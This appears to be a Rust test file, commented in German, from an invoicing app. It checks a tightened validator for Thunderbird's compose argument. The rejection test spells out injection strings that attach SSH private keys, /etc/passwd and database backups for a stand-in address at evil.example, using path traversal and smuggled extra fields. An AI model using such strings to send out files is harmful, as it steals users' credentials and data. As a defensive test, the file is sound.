//! Security-Audit F12 (Variante A): Validator für Thunderbirds `-compose`-Argument in
//! `capabilities/default.json`.
//!
//! Vorher ließ `(?s)^.*$` jeden Text durch – ein eingeschleustes Skript hätte ein Mailfenster
//! mit beliebiger Datei als Anhang öffnen können (z. B. SSH-Schlüssel, Datenbank-Backup).
//! Jetzt nur noch die Felder to/cc/subject/body/attachment in fester Reihenfolge, Werte ohne
//! rohes Apostroph/Komma, Anhänge nur `rechnungsfee_…` direkt im Temp-Ordner.
//!
//! Geprüft mit dem `regex`-Crate wie in tauri-plugin-shell (`raw: true` → keine zusätzliche
//! Verankerung). Ein ungültiger Ausdruck ließe die App beim Start abstürzen (panic).

use regex::Regex;

fn validatoren() -> Vec<Regex> {
    let pfad = concat!(env!("CARGO_MANIFEST_DIR"), "/capabilities/default.json");
    let json: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(pfad).unwrap()).unwrap();
    let mut ergebnis = Vec::new();
    for perm in json["permissions"].as_array().unwrap() {
        if perm["identifier"] != "shell:allow-spawn" {
            continue;
        }
        for eintrag in perm["allow"].as_array().unwrap() {
            for arg in eintrag["args"].as_array().unwrap() {
                if let Some(v) = arg.get("validator") {
                    assert_eq!(arg["raw"], true, "{}: raw muss true sein", eintrag["name"]);
                    ergebnis.push(Regex::new(v.as_str().unwrap()).unwrap());
                }
            }
        }
    }
    assert_eq!(ergebnis.len(), 6, "alle sechs Thunderbird-Varianten brauchen den Validator");
    let erster = ergebnis[0].as_str().to_string();
    assert!(ergebnis.iter().all(|r| r.as_str() == erster), "Validatoren müssen identisch sein");
    ergebnis
}

/// Nachbau von escapeThunderbirdFeld() (src/frontend/src/utils/thunderbirdVersand.ts)
fn esc(wert: &str) -> String {
    wert.replace('\\', "\\\\").replace(',', "\\,").replace('\'', "\\'")
}

/// Nachbau von baueComposeString()
fn compose(an: &str, cc: Option<&str>, betreff: &str, text: &str, anhaenge: &[&str]) -> String {
    let mut felder = vec![format!("to='{}'", esc(an))];
    if let Some(cc) = cc {
        felder.push(format!("cc='{}'", esc(cc)));
    }
    felder.push(format!("subject='{}'", esc(betreff)));
    felder.push(format!("body='{}'", esc(text)));
    if !anhaenge.is_empty() {
        let wert: Vec<String> = anhaenge.iter().map(|p| format!("file://{p}")).collect();
        felder.push(format!("attachment='{}'", esc(&wert.join(","))));
    }
    felder.join(",")
}

const TEXT: &str = "Hallo Frau Müller,\n\nanbei die Rechnung, wie besprochen.\nIt's \\ ok.\n\nViele Grüße";

#[test]
fn echte_aufrufe_sind_erlaubt() {
    let v = &validatoren()[0];
    let faelle = [
        compose("kunde@example.org", None, "Rechnung RE-260001", TEXT, &[]),
        compose("a@example.org, b@example.org", Some("c@example.org"), "Angebot, Nr. 5", TEXT,
                &["/tmp/rechnungsfee_Angebot_ANG-260005.pdf"]),
        compose("a@example.org", None, "Paket", TEXT, &[
            "/tmp/rechnungsfee_Rechnung_RE-260001.pdf",
            "/tmp/rechnungsfee_AGB.pdf",
            "/tmp/rechnungsfee_XRechnung_RE-260001.xml",
        ]),
        compose("a@example.org", None, "macOS", TEXT,
                &["/var/folders/x7/abc123_def/T/rechnungsfee_Rechnung 1.pdf"]),
        compose("a@example.org", None, "Windows", TEXT,
                &[r"C:\Users\Max.Mustermann\AppData\Local\Temp\rechnungsfee_Rechnung_RE-260001.pdf"]),
        compose("a@example.org", None, "Windows Terminalserver", TEXT,
                &[r"C:\Users\max\AppData\Local\Temp\2\rechnungsfee_Datenauskunft.pdf"]),
        compose("", None, "", "", &[]),
    ];
    for f in &faelle {
        assert!(v.is_match(f), "abgelehnt, sollte erlaubt sein:\n{f}");
    }
}

#[test]
fn fremde_anhaenge_und_felder_sind_gesperrt() {
    let v = &validatoren()[0];
    let faelle = [
        // beliebige Datei als Anhang
        compose("x@evil.example", None, "x", "x", &["/home/nicole/.ssh/id_ed25519"]),
        // Datenbank-Backup trägt ebenfalls das Präfix rechnungsfee_ – liegt aber nicht im Temp-Ordner
        compose("x@evil.example", None, "x", "x",
                &["/home/nicole/.local/share/RechnungsFee/profile/Standard/backups/rechnungsfee_20261114_120000.db"]),
        compose("x@evil.example", None, "x", "x",
                &[r"C:\Users\max\AppData\Roaming\RechnungsFee\profile\Standard\rechnungsfee.db"]),
        // Ausbruch aus dem Temp-Ordner
        compose("x@evil.example", None, "x", "x", &["/tmp/../home/nicole/rechnungsfee_x"]),
        compose("x@evil.example", None, "x", "x", &["/tmp/sub/rechnungsfee_x.pdf"]),
        // ohne Präfix
        compose("x@evil.example", None, "x", "x", &["/tmp/geheim.pdf"]),
        // nicht escapter Wert erzeugt zusätzliches Feld
        "to='x@evil.example',subject='x',body='y',attachment='file:///etc/passwd'".into(),
        "to='x@evil.example',subject='a',attachment='file:///etc/passwd',body='y'".into(),
        "to='x@evil.example',subject='x',body='a',message='/home/nicole/.ssh/id_ed25519'".into(),
        "to='a',attachment='file:///etc/passwd',subject='x',body='y'".into(),
        "to='a,attachment=file:///etc/passwd',subject='x',body='y'".into(),
        // anderes Format (ohne Anführungszeichen) und fremde Optionen
        "to=x@evil.example,attachment=file:///etc/passwd".into(),
        "-remote".into(),
    ];
    for f in &faelle {
        assert!(!v.is_match(f), "erlaubt, sollte gesperrt sein:\n{f}");
    }
}
